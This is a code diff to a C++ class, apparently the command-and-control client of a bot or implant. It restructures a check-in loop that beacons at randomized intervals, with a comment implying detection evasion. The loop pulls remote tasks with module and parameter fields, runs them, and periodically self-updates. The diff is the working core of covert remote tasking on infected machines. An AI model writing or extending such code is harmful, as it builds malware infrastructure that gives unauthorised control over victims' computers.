@@ -26,21 +26,6 @@ Candcel::~Candcel()
 
 void Candcel::InitClass()
 {
-	if (!Config::Current()->CanConnect()) {
-		return;
-	}
-
-	if (!IsAlive()) {
-		return;
-	}
-
-	Solicit();
-
-	if (!Config::Current()->CanUpdate()) {
-		return;
-	}
-
-	CheckForUpdate();
 }
 
 
@@ -70,7 +55,9 @@ bool Candcel::IsAlive()
 
 DWORD Candcel::CheckIn()
 {
-	while (true) {
+	checkInCount = SOLICIT_PACE + 1;
+
+	do {
 		int nextInterval = (rand() % (CHECKIN_PACE + 1));
 
 		// Randomize the interval for obvious reasons
@@ -118,7 +105,7 @@ DWORD Candcel::CheckIn()
 			if (returnObj->IsObject()) {
 				if (returnObj->HasChild(L"task")) {
 					std::wstring mod = returnObj->Child(L"mod")->AsString();
-					
+
 					Task task(mod);
 
 					if (returnObj->HasChild(L"param")) {
@@ -146,11 +133,14 @@ DWORD Candcel::CheckIn()
 		}
 
 		// Check for updates after about a day
-		if (checkInCount > SOLICIT_PACE) {
-			CheckForUpdate();
-			checkInCount = 0;
+		if (Config::Current()->CanUpdate()) {
+			if (checkInCount > SOLICIT_PACE) {
+				CheckForUpdate();
+				checkInCount = 0;
+			}
 		}
-	}
+
+	} while (true);
 
 	return 0;
 }
